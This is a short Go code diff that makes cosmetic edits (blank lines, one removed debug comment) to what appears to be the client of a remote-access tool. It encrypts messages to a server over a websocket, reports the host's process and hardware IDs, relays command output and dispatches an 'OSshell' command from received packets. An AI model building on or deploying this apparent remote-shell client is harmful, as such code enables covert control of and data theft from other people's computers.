@@ -27,6 +27,7 @@ func SendData(data []byte, Connection *wsc.Wsc) {
 	}
 	Connection.SendBinaryMessage(endata)
 }
+
 func SessionLog(log string, Connection *wsc.Wsc, unmsgpack MessagePack.MsgPack) {
 	result := ""
 	result = string(log)
@@ -43,7 +44,6 @@ func SessionLog(log string, Connection *wsc.Wsc, unmsgpack MessagePack.MsgPack) 
 	msgpack.ForcePathObject("ProcessIDClientHWID").SetAsString(PcInfo.GetProcessID() + PcInfo.GetHWID())
 	msgpack.ForcePathObject("ReadInput").SetAsString(utf8Stdout)
 	SendData(msgpack.Encode2Bytes(), Connection)
-
 }
 
 func Read(Data []byte, Connection *wsc.Wsc) {
@@ -53,7 +53,6 @@ func Read(Data []byte, Connection *wsc.Wsc) {
 		return
 	}
 	unmsgpack.DecodeFromBytes(deData)
-	//fmt.Print(string(deData))
 	switch unmsgpack.ForcePathObject("Pac_ket").GetAsString() {
 
 	case "OSshell":
